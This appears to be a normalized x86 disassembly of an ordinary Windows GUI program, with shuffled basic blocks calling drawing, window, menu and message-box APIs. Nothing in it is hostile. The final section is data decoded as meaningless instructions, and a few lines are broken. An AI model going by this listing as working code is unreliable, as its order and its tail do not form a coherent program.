lea eax [ ebx + 0x6 ]
push eax
push esi
call [ LineTo@IAT ]
push 0x0
push 0x10
lea ecx [ ebx + 0x7 ]
push ecx
push esi
call [ MoveToEx@IAT ]
push 0x10
lea edx [ ebx + 0xa ]
push edx
push esi
call [ LineTo@IAT ]
push 0x0
push 0x10
lea eax [ ebx + 0xb ]
push eax
push esi
call [ MoveToEx@IAT ]
push 0x10
add ebx 0xe
push ebx
cmp [ rw-data ] 0x2
jne r-xdata
push esi
call [ LineTo@IAT ]
mov ebx [ ebp + 0xc ]
mov [ ebp + 0x10 ] eax
push edx
push edx
push ebx
mov [ rw-data ] edx
mov [ rw-data ] edx
call [ InvalidateRect@IAT ]
push ebx
call [ UpdateWindow@IAT ]
test esi esi
jne r-xdata
cmp di 0xce
jne r-xdata
add ecx 0x38
call sub_41f020
dec eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
cmp [ edi * 4 + rw-data ] eax
jne r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0xffffffff
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x3c ]
inc eax
cmp eax ecx
mov [ ebp - 0x14 ] eax
jl r-xdata
cmp di 0x112
jne r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x34 ] esi
jb r-xdata
lea ecx [ eax + 0x20 ]
mov ecx [ eax + 0x20 ]
jmp r-xdata
mov edx [ esi ]
push edx
lea ecx [ ebp - 0x6c ]
call sub_402010
push r--data
lea ecx [ ebp - 0x6c ]
call sub_402010
cmp [ edi + 0x14 ] ebx
jb r-xdata
cmp [ ebp - 0x54 ] ebx
mov eax [ ebp - 0x68 ]
jae r-xdata
push eax
lea ecx [ ebp - 0x6c ]
call sub_402010
push r--data
lea ecx [ ebp - 0x6c ]
call sub_402010
add esi 0x4
add edi 0x1c
cmp esi rw-data
jl r-xdata
cmp eax edi
jb r-xdata
cmp eax edi
jb r-xdata
push eax
call [ GetFileAttributesA@IAT ]
test al 0x10
mov eax [ esi + 0x18 ]
je r-xdata
test al 0x10
je r-xdata
push eax
call [ GetFileAttributesA@IAT ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov ecx eax
and ecx 0x7
shl ecx 0x4
mov edx [ ecx + rw-data ]
cmp [ edx + esi * 4 ] 0x1
jne r-xdata
mov ecx [ rw-data ]
lea eax [ ebp - 0x44 ]
push eax
push ecx
call [ ScreenToClient@IAT ]
mov edx [ ebp - 0x44 ]
mov eax [ ebp - 0x40 ]
lea ecx [ ebp - 0x64 ]
push ecx
push 0x0
mov [ ebp - 0x64 ] edx
mov edx [ rw-data ]
push 0x1039
push edx
mov [ ebp - 0x60 ] eax
call edi
mov esi [ ebp - 0x54 ]
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
push 0x0
push 0xfffffffa
push eax
call [ GetWindowLongA@IAT ]
mov ecx [ rw-data ]
mov edx [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x30 ]
push 0xc8
push ecx
mov ecx [ ebp - 0x34 ]
sub edx eax
push edx
mov edx [ ebp - 0x2c ]
sub edx ecx
push edx
push eax
mov eax [ ebp - 0x20 ]
push ecx
push eax
push r--data
push r--data
push 0x0
call [ CreateWindowExA@IAT ]
mov ecx [ rw-data ]
push 0x0
push 0x0
push 0x0
push 0x31
push ecx
mov [ rw-data ] eax
call edi
mov edx [ rw-data ]
push eax
push 0x30
push edx
call edi
test ebx ebx
jne r-xdata
mov [ ebp - 0x20 ] 0x50803080
push edx
call edi
cmp [ ebx * 4 + rw-data ] 0x69
mov [ ebp - 0x20 ] 0x50801080
jne r-xdata
mov esi [ ecx + rw-data ]
test esi esi
je r-xdata
mov edx [ ecx + rw-data ]
lea eax [ edx + esi * 4 ]
mov edx [ eax + 0x4 ]
mov [ eax ] edx
inc esi
jmp r-xdata
dec eax
cmp esi eax
jge r-xdata
cmp [ edi * 4 + rw-data ] ebx
jl r-xdata
cmp [ eax + 0x380 ] edi
jne r-xdata
push 0x1
push 0xffffffff
push 0xffffffff
push 0x0
push 0xffffffff
call sub_423380
add esp 0x14
jmp r-xdata
mov edx [ ebp + 0x8 ]
push 0xcb
push 0xfffffffa
push edx
call [ GetWindowLongA@IAT ]
push eax
call [ LoadMenuA@IAT ]
mov edi eax
push 0x0
push edi
call [ GetSubMenu@IAT ]
mov esi eax
mov al [ rw-data ]
test al 0x7
jne r-xdata
mov ecx [ rw-data ]
cmp ecx ebx
je r-xdata
mov eax 0x20
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov ecx [ eax * 4 + rw-data ]
movzx eax [ eax * 4 + rw-data ]
mov edx ecx
and edx 0xff
shl edx 0x10
or edx eax
and ecx 0xff00
or edx ecx
mov [ esi + 0x34 ] edx
push 0x0
push 0x0
push 0x1037
push eax
mov [ rw-data ] eax
call esi
mov edx [ rw-data ]
or eax 0x31
push eax
push 0x0
push 0x1036
push edx
call esi
mov eax [ rw-data ]
push sub_426030
push 0xfffffffc
push eax
call [ SetWindowLongA@IAT ]
mov ecx [ ebp + 0x14 ]
mov edx [ ecx + 0x4 ]
push 0x0
push edx
push 0x0
mov [ rw-data ] eax
mov eax [ rw-data ]
push eax
push 0x80000000
push 0x80000000
push 0x80000000
push 0x80000000
push 0x1
push r--data
push r--data
push 0x0
call [ CreateWindowExA@IAT ]
mov edx eax
xor eax eax
mov ecx 0xb
mov edi rw-data
[ edi ]
push edx
mov [ rw-data ] edx
mov [ rw-data ] 0x2c
mov [ rw-data ] 0xb1
call [ GetParent@IAT ]
mov edx [ rw-data ]
mov ecx [ rw-data ]
push rw-data
push 0x0
push 0x404
push edx
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] r--data
call esi
mov eax [ rw-data ]
and eax 0x7
push 0x0
push eax
call sub_425b70
add esp 0x8
jmp r-xdata
mov eax [ ebp - 0x20 ]
push eax
push esi
call [ SelectObject@IAT ]
mov ecx [ ebp + 0x14 ]
mov esi [ DeleteObject@IAT ]
push ecx
call esi
mov edx [ ebp - 0x14 ]
push edx
call esi
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0xf4 ]
push eax
push ecx
call [ EndPaint@IAT ]
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov ecx [ ebp - 0x14 ]
push ecx
jmp r-xdata
cmp eax ecx
jne r-xdata
mov ebx 0x1
cmp esi 0x1
jne r-xdata
mov ecx [ rw-data ]
push esi
push 0xc3
push 0x111
push ecx
call [ SendMessageA@IAT ]
jmp r-xdata
cmp di 0x123
jne r-xdata
add ecx 0x70
call sub_41f020
dec eax
jmp r-xdata
cmp edi 0x3
jne r-xdata
mov [ edi * 4 + rw-data ] 0xffffffff
cmp [ ebp - 0x18 ] 0xffffffff
je r-xdata
cmp di 0x113
jne r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x8 ]
mov ecx [ eax + 0x34 ]
add eax 0x1c
cmp ecx esi
mov [ ebp - 0x4 ] 0x1
jb r-xdata
push 0x0
push eax
push 0x0
push 0x0
lea ecx [ eax + 0x20 ]
push ecx
push 0x1
jmp r-xdata
mov ecx [ eax + 0x20 ]
push 0x0
push eax
push 0x0
push 0x0
push ecx
push 0x1
jmp r-xdata
push 0x0
push eax
push 0x0
push 0x0
push ecx
push 0x0
push 0x40
push r--data
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ MessageBoxA@IAT ]
lea ecx [ ebp - 0x6c ]
call sub_4480e0
jmp r-xdata
lea eax [ ebp - 0x68 ]
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
add esi 0x4
push esi
lea ecx [ ebp - 0x6c ]
call sub_402510
jmp r-xdata
mov esi [ esi + 0x4 ]
push esi
lea ecx [ ebp - 0x6c ]
call sub_402510
jmp r-xdata
cmp [ esi + 0x18 ] edi
jb r-xdata
mov edx [ ebp - 0x14 ]
and eax 0x7
shl eax 0x4
mov ecx [ eax + rw-data ]
mov ebx [ ecx + esi * 4 ]
mov ecx [ rw-data ]
lea eax [ ebp - 0xa4 ]
push eax
push 0x0
push 0x1005
push ecx
mov [ ebp - 0xa4 ] 0x4
mov [ ebp - 0xa0 ] edx
mov [ ebp - 0x9c ] 0x0
call edi
test esi esi
mov edx [ ebp - 0x84 ]
mov ecx [ ebp - 0x14 ]
lea eax [ ebp - 0x34 ]
push eax
mov [ ebp - 0x50 ] edx
mov edx [ rw-data ]
push ecx
jne r-xdata
mov eax [ ebp + 0x8 ]
push 0x10
push r--data
push r--data
push eax
call [ MessageBoxA@IAT ]
jmp r-xdata
mov ecx [ ebp - 0x50 ]
imul ebx ebx 0x1c
mov eax [ ebx + ecx + 0x18 ]
add ebx ecx
cmp eax 0x10
jb r-xdata
mov eax [ ebp - 0x50 ]
mov edx [ eax + 0x34 ]
mov ecx 0x10
cmp edx ecx
jb r-xdata
mov [ edi ] 0xffffffff
call sub_421430
jmp r-xdata
mov edx [ ecx + rw-data ]
mov eax edx
sub eax esi
sar eax 0x2
test eax eax
je r-xdata
mov edx [ ecx + rw-data ]
test edx edx
jne r-xdata
mov edx [ ebp - 0x1c ]
push sub_420b00
push esi
push 0x1030
push edx
call [ SendMessageA@IAT ]
lea ebx [ edi + edi * 2 ]
lea eax [ ebp - 0xf8 ]
shl ebx 0x2
push eax
lea ecx [ ebx + rw-data ]
mov [ edi * 4 + rw-data ] esi
mov [ ebp - 0x78 ] 0x4
mov [ ebp - 0x18 ] 0x0
call sub_4209f0
mov esi [ eax ]
cmp esi [ ebx + rw-data ]
je r-xdata
lea ebx [ edi + edi * 2 ]
lea eax [ ebp - 0x100 ]
shl ebx 0x2
push eax
lea ecx [ ebx + rw-data ]
call sub_4209f0
mov eax [ eax ]
mov ebx [ ebx + rw-data ]
cmp eax ebx
je r-xdata
mov [ ebp - 0x14 ] eax
jmp r-xdata
and al 0x7
cmp al 0x1
jne r-xdata
push 0x1
push 0xd0
push esi
call [ EnableMenuItem@IAT ]
mov al [ rw-data ]
mov ebx [ esi + 0x24 ]
cmp ebx [ eax * 4 + rw-data ]
je r-xdata
cmp [ ecx + 0x380 ] eax
jne r-xdata
push esi
call [ SelectObject@IAT ]
mov eax [ edi + rw-data ]
mov ecx [ edi + rw-data ]
push 0x0
push eax
push ecx
push esi
call [ MoveToEx@IAT ]
mov edx [ edi + rw-data ]
mov eax [ edi + rw-data ]
mov ebx [ LineTo@IAT ]
push edx
push eax
push esi
call ebx
mov ecx [ edi + rw-data ]
mov edx [ edi + rw-data ]
push ecx
push edx
push esi
call ebx
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov edx [ ebp + 0x14 ]
push edx
push ebx
call [ GetDC@IAT ]
mov edx [ rw-data ]
push 0x0
push 0x0
push 0x31
mov esi eax
push edx
mov [ ebp - 0x50 ] esi
call [ SendMessageA@IAT ]
push eax
push esi
call [ SelectObject@IAT ]
mov edi [ rw-data ]
and edi 0x7
mov [ ebp - 0x38 ] eax
xor edx edx
mov eax edi
shl eax 0x4
mov [ ebp - 0x3c ] edi
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x7c ] eax
nop
mov [ rw-data ] 0xb
mov eax [ ebx + 0x8 ]
test eax eax
mov [ ebp - 0x20 ] eax
je r-xdata
mov ecx [ ebx + 0x8 ]
push ecx
call sub_42b540
add esp 0x4
mov eax [ rw-data ]
push 0x0
push 0x0
push 0x1004
push eax
call [ SendMessageA@IAT ]
cmp [ ebp - 0x18 ] eax
jge r-xdata
cmp di 0x11a
jne r-xdata
mov ecx [ ebx + 0x8 ]
push 0x1
add ecx 0x118
call sub_41f020
mov ecx [ ebx + 0x8 ]
dec eax
push eax
push ecx
call sub_425f00
add esp 0xc
cmp eax 0x1
jne r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
call sub_423c30
add esp 0x18
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
cmp [ esi + 0x18 ] edi
jb r-xdata
cmp [ ebp - 0x54 ] edi
mov eax [ ebp - 0x68 ]
jae r-xdata
add esi 0x4
push esi
call sub_464fe0
add esp 0x4
jmp r-xdata
mov esi [ esi + 0x4 ]
push esi
call sub_464fe0
add esp 0x4
jmp r-xdata
lea eax [ ebx + 0x4 ]
mov eax [ ebx + 0x4 ]
jmp r-xdata
lea ebx [ eax + 0x20 ]
mov ebx [ eax + 0x20 ]
jmp r-xdata
add edx 0xfffffffc
mov [ ecx + rw-data ] edx
cmp edi 0x3
jne r-xdata
lea esp [ esp ]
nop
mov eax [ rw-data ]
push 0x1
push 0xffffffff
push 0x100c
push eax
call ebx
cmp eax 0xffffffff
je r-xdata
push 0x1
push 0xd1
push esi
call [ EnableMenuItem@IAT ]
lea ecx [ eax * 4 + rw-data ]
mov eax [ ecx ]
movzx ecx [ ecx + 0x2 ]
mov edx eax
and edx 0xff
shl edx 0x10
or edx ecx
and eax 0xff00
or edx eax
mov [ esi + 0x34 ] edx
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov ecx [ eax * 4 + rw-data ]
cmp [ eax * 4 + rw-data ] ecx
lea edx [ eax * 4 + rw-data ]
je r-xdata
mov ecx [ esi + 0x24 ]
cmp ecx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x14 ]
push ecx
mov eax [ ebp + 0x14 ]
push eax
jmp r-xdata
mov eax [ eax + rw-data ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
push ebx
lea ecx [ ebp - 0xfc ]
push ecx
mov ecx [ ebp - 0x38 ]
call sub_420c40
mov edx [ rw-data ]
mov ebx [ eax ]
push 0x0
push esi
push 0x1008
push edx
call [ SendMessageA@IAT ]
inc [ ebp - 0x1c ]
push sub_4480e0
push 0x20
push 0x1c
mov edx eax
push edx
call sub_4b6814
mov eax [ ebp - 0x20 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov edx [ ebp - 0x18 ]
lea ecx [ ebp - 0xdc ]
push ecx
mov eax 0x3
push edx
mov [ ebp - 0xcc ] eax
mov [ ebp - 0xd0 ] eax
mov eax [ rw-data ]
push 0x102b
push eax
call [ SendMessageA@IAT ]
mov ecx [ ebx + 0x8 ]
push 0x1
add ecx 0x2d8
call sub_41f020
dec eax
push eax
mov eax [ ebx + 0x8 ]
push eax
call sub_425f00
add esp 0xc
cmp eax 0x1
jne r-xdata
mov edx [ rw-data ]
push 0x0
push 0xf5
push 0x111
push edx
call [ PostMessageA@IAT ]
jmp r-xdata
test eax eax
mov esi [ ebp - 0x1c ]
mov [ ebp - 0x4 ] 0x0
je r-xdata
push 0x2
push 0x0
push 0x0
push 0x0
push 0x0
push eax
call sub_41c070
add esp 0x18
push eax
lea ecx [ ebp - 0x1c ]
call sub_401020
mov eax 0x1
jmp r-xdata
push ebx
push eax
call sub_42dee0
add esp 0x8
lea ecx [ ebp - 0x6c ]
call sub_4480e0
jmp r-xdata
lea eax [ ebp - 0x68 ]
push eax
call sub_457f40
add esp 0x4
dec eax
push eax
push esi
lea ecx [ ebp - 0x6c ]
call sub_401e80
push eax
mov eax [ rw-data ]
push 0x0
push 0xc
push eax
call edi
mov ecx [ rw-data ]
push ecx
call [ SetFocus@IAT ]
mov edx [ rw-data ]
push 0xffffffff
push 0x0
push 0xb1
push edx
call edi
movzx ecx [ ebp - 0x14 ]
mov edx [ rw-data ]
movzx eax si
mov esi [ SetWindowLongA@IAT ]
shl eax 0x10
or eax ecx
push eax
push 0xffffffeb
push edx
call esi
mov eax [ rw-data ]
push sub_424560
push 0xfffffffc
push eax
call esi
mov [ rw-data ] eax
jmp r-xdata
add eax 0x20
push eax
call sub_457f40
add esp 0x4
add eax ebx
jmp r-xdata
mov eax [ eax + 0x20 ]
push eax
call sub_457f40
add esp 0x4
add eax ebx
jmp r-xdata
cmp [ eax + 0x34 ] ecx
jb r-xdata
call sub_429ec0
jmp r-xdata
mov ecx [ ebp - 0x18 ]
mov esi [ esi ]
mov eax [ ebx + rw-data ]
inc ecx
cmp esi eax
mov [ ebp - 0x18 ] ecx
jne r-xdata
mov eax [ rw-data ]
test eax eax
mov ecx [ ebp - 0x18 ]
mov [ edi * 4 + rw-data ] ecx
je r-xdata
mov ecx [ eax + 0x8 ]
mov [ ebp - 0x14 ] ecx
mov eax [ eax ]
inc edx
cmp eax ebx
mov [ ebp - 0x18 ] edx
jne r-xdata
mov edx [ rw-data ]
lea ecx [ ebp - 0xdc ]
push ecx
push 0x0
push 0x1005
push edx
mov [ ebp - 0xdc ] 0x4
mov [ ebp - 0xd8 ] eax
call ebx
test eax eax
je r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
test bl 0x1
je r-xdata
mov ecx [ eax * 4 + rw-data ]
movzx edi [ eax * 4 + rw-data ]
mov edx ecx
and edx 0xff
shl edx 0x10
or edx edi
and ecx 0xff00
or edx ecx
mov [ esi + 0x30 ] edx
push esi
call [ SelectObject@IAT ]
mov edx [ edi + rw-data ]
mov eax [ edi + rw-data ]
push edx
push eax
push esi
call ebx
mov ecx [ edi + rw-data ]
mov edx [ edi + rw-data ]
push ecx
push edx
push esi
call ebx
mov ebx [ ebp + 0x10 ]
mov edx [ ebp - 0x38 ]
push edx
push esi
call [ SelectObject@IAT ]
push esi
push ebx
call [ ReleaseDC@IAT ]
mov esi [ ebp - 0x20 ]
mov edi [ ebp - 0x40 ]
mov eax [ rw-data ]
push 0x0
push edx
push 0x101d
push eax
call [ SendMessageA@IAT ]
lea edi [ edi + edi * 2 ]
lea ecx [ ebp - 0x18 ]
shl edi 0x2
push ecx
lea ecx [ edi + rw-data ]
mov [ ebp - 0xb0 ] eax
mov [ ebp - 0x1c ] 0x14
call sub_4209f0
mov edx [ ebp - 0x18 ]
cmp edx [ edi + rw-data ]
je r-xdata
cmp edx eax
jge r-xdata
mov ecx [ rw-data ]
push 0x0
push 0xfb
push 0x111
push ecx
call [ PostMessageA@IAT ]
jmp r-xdata
mov edx [ rw-data ]
push 0x10
push r--data
push r--data
push edx
call [ MessageBoxA@IAT ]
test esi esi
mov ecx [ ebx + 0x8 ]
push ecx
push ecx
mov [ ebp - 0x3c ] esp
mov eax esp
je r-xdata
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x78 ]
push edx
push 0x0
push 0x1005
push eax
mov [ ebp - 0x74 ] ecx
mov [ ebp - 0x70 ] 0x0
call [ SendMessageA@IAT ]
mov ecx [ ebp - 0x58 ]
mov edx [ ebp - 0x14 ]
mov [ esi + 0x8 ] ecx
cmp edx [ ebp - 0x58 ]
jne r-xdata
cmp [ eax + 0x380 ] edi
jne r-xdata
mov ecx [ edi * 4 + rw-data ]
mov edx [ ebp - 0x18 ]
cmp ecx edx
je r-xdata
jmp r-xdata
push rw-data
call [ GetCursorPos@IAT ]
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
mov edx [ rw-data ]
push 0x0
push eax
push 0x0
push ecx
push edx
push 0x0
push esi
call [ TrackPopupMenu@IAT ]
push edi
call [ DestroyMenu@IAT ]
jmp r-xdata
movzx edx [ edx + 0x2 ]
mov eax ecx
and eax 0xff
shl eax 0x10
or eax edx
and ecx 0xff00
or eax ecx
mov [ esi + 0x34 ] eax
mov eax [ ebp - 0x1c ]
cmp eax [ ebp - 0xb0 ]
je r-xdata
jmp r-xdata
dec [ esi + 0x4 ]
jne r-xdata
mov [ eax ] esi
call sub_406260
add esp 0x8
test eax eax
jne r-xdata
inc [ esi + 0x4 ]
mov [ rw-data ] ecx
mov eax [ ebp - 0x14 ]
mov ebx [ ebp + 0x8 ]
mov edi [ ebp - 0x3c ]
mov esi [ ebp - 0x50 ]
inc eax
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x7c ]
mov edx [ ebp - 0x14 ]
jmp r-xdata
mov ecx [ rw-data ]
movzx edx ax
mov eax [ ebp - 0x14 ]
push edx
push eax
push 0x101e
push ecx
call [ SendMessageA@IAT ]
mov eax [ ebp - 0x7c ]
mov ecx [ eax + rw-data ]
mov edx [ ebp - 0x14 ]
mov eax [ ecx + edx * 4 ]
test eax eax
jne r-xdata
mov eax [ esi ]
push 0x1
mov ecx esi
call [ eax ]
mov eax [ ebp - 0x14 ]
mov ebx [ ebx ]
mov edi [ ebp + 0x10 ]
inc eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x18 ] ebx
jmp r-xdata
test esi esi
mov [ ebp - 0x4 ] 0xffffffff
je r-xdata
mov ecx [ eax + rw-data ]
test ecx ecx
jne r-xdata
mov ecx [ ebp - 0x18 ]
imul eax eax 0x1c
mov edx [ ecx + 0x8 ]
mov ecx [ eax + edx + 0x18 ]
add eax edx
cmp ecx 0x10
jb r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x34 ]
mov ecx 0x10
cmp edx ecx
jb r-xdata
lea esi [ eax + 0x4 ]
mov esi [ eax + 0x4 ]
jmp r-xdata
lea ebx [ eax + 0x20 ]
mov ebx [ eax + 0x20 ]
jmp r-xdata
mov ecx [ ebp - 0x18 ]
mov eax [ ecx ]
cmp eax [ edi + rw-data ]
mov [ ebp - 0x18 ] eax
jne r-xdata
mov [ ebp - 0x1c ] eax
lea edx [ ebp - 0x2c ]
push edx
push esi
call [ lstrlenA@IAT ]
push eax
mov eax [ ebp - 0x50 ]
push esi
push eax
call [ GetTextExtentPoint32A@IAT ]
mov eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x1c ]
add eax 0xc
cmp ecx eax
jge r-xdata
add eax 0x20
push eax
call sub_457f40
mov esi eax
add esp 0x4
add esi ebx
jmp r-xdata
mov eax [ eax + 0x20 ]
push eax
call sub_457f40
mov esi eax
add esp 0x4
add esi ebx
jmp r-xdata
cmp [ eax + 0x34 ] ecx
jb r-xdata
sub_427dcf
mov ebx [ ebp - 0x18 ]
mov eax [ ebp - 0x3c ]
mov edx [ rw-data ]
push 0x10
push r--data
push r--data
push edx
call [ MessageBoxA@IAT ]
test esi esi
mov ecx [ ebx + 0x8 ]
push ecx
push ecx
mov [ ebp - 0x3c ] esp
mov eax esp
je r-xdata
mov eax [ ebp - 0x14 ]
mov ebx [ ebx ]
mov edi [ ebp + 0x10 ]
inc eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x18 ] ebx
jmp r-xdata
dec [ esi + 0x4 ]
jne r-xdata
mov [ eax ] esi
call sub_406260
add esp 0x8
test eax eax
jne r-xdata
inc [ esi + 0x4 ]
mov ecx [ ebp - 0x40 ]
mov eax [ ebp - 0x14 ]
cmp eax ecx
mov esi 0x10
jge r-xdata
mov eax [ esi ]
push 0x1
mov ecx esi
call [ eax ]
mov eax [ ebp - 0x14 ]
mov ebx [ ebx ]
mov edi [ ebp + 0x10 ]
inc eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x18 ] ebx
jmp r-xdata
test esi esi
mov [ ebp - 0x4 ] 0xffffffff
je r-xdata
mov edx [ ebp + 0x14 ]
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
push edx
mov edx [ ebp + 0x8 ]
push eax
push ecx
push edx
call [ DefWindowProcA@IAT ]
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov edx eax
mov eax [ ebp - 0x38 ]
push 0x2
sub edx eax
mov eax [ rw-data ]
push edx
push 0x102c
push eax
call [ SendMessageA@IAT ]
test eax eax
je r-xdata
cmp di 0xd0
jne r-xdata
cmp di 0xd1
jne r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x34 ] esi
jb r-xdata
cmp di 0x112
jne r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x34 ] esi
jb r-xdata
lea ecx [ eax + 0x20 ]
mov ecx [ eax + 0x20 ]
jmp r-xdata
cmp di 0x113
jne r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x8 ]
mov ecx [ eax + 0x34 ]
add eax 0x1c
cmp ecx esi
mov [ ebp - 0x4 ] 0x1
jb r-xdata
push 0x0
push eax
push 0x0
push 0x0
lea ecx [ eax + 0x20 ]
push ecx
push 0x1
jmp r-xdata
mov ecx [ eax + 0x20 ]
push 0x0
push eax
push 0x0
push 0x0
push ecx
push 0x1
jmp r-xdata
push 0x0
push eax
push 0x0
push 0x0
push ecx
push 0x0
cmp di 0x11a
jne r-xdata
mov ecx [ ebx + 0x8 ]
push 0x1
add ecx 0x118
call sub_41f020
mov ecx [ ebx + 0x8 ]
dec eax
push eax
push ecx
call sub_425f00
add esp 0xc
cmp eax 0x1
jne r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
call sub_423c30
add esp 0x18
mov ecx [ ebx + 0x8 ]
push 0x1
add ecx 0x2d8
call sub_41f020
dec eax
push eax
mov eax [ ebx + 0x8 ]
push eax
call sub_425f00
add esp 0xc
cmp eax 0x1
jne r-xdata
mov edx [ rw-data ]
push 0x0
push 0xf5
push 0x111
push edx
call [ PostMessageA@IAT ]
jmp r-xdata
test eax eax
mov esi [ ebp - 0x1c ]
mov [ ebp - 0x4 ] 0x0
je r-xdata
push 0x2
push 0x0
push 0x0
push 0x0
push 0x0
push eax
call sub_41c070
add esp 0x18
push eax
lea ecx [ ebp - 0x1c ]
call sub_401020
mov eax 0x1
jmp r-xdata
mov ecx [ rw-data ]
push 0x0
push 0xfb
push 0x111
push ecx
call [ PostMessageA@IAT ]
jmp r-xdata
sub_428502
add eax 0x5050505
add eax 0x5030505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x70979004
inc edx
add [ ebx + 0x7004270 ] ch
jb r-xdata
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x3050505
add eax 0x5050505
add [ 0x23004273 ] bh
jb r-xdata
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add [ edx ] eax
add ecx [ ebx + 0x427a2cff ]
add bh ah
jpe r-xdata
add [ ecx + 0x4284 ] bh
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
or bh [ edx + 0x42 ]
add [ edx + 0x79 ] cl
inc edx
add [ ebx - 0x48ffbd8a ] cl
jbe r-xdata
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050503
add eax 0x5040505
add al 0x90
add eax 0x90040504
add [ ecx + 0x4284 ] bh
add [ 0x5050505 ] eax
add eax 0x5050205
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax [ 0x5050505 ]
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
add [ esi - 0x14ffbd84 ] bl
jle r-xdata
add eax 0x8080608
or [ eax ] cl
or [ eax ] cl
or [ edi ] al
add cl ah
jg r-xdata
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
add al [ edx ]
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
add cl [ eax ]
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] al
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
pop es
add [ edi - 0x1dffbd7f ] dl
add [ edx ] 0x3c
test [ edx ] al
mov ecx 0x4284
add [ eax ] al
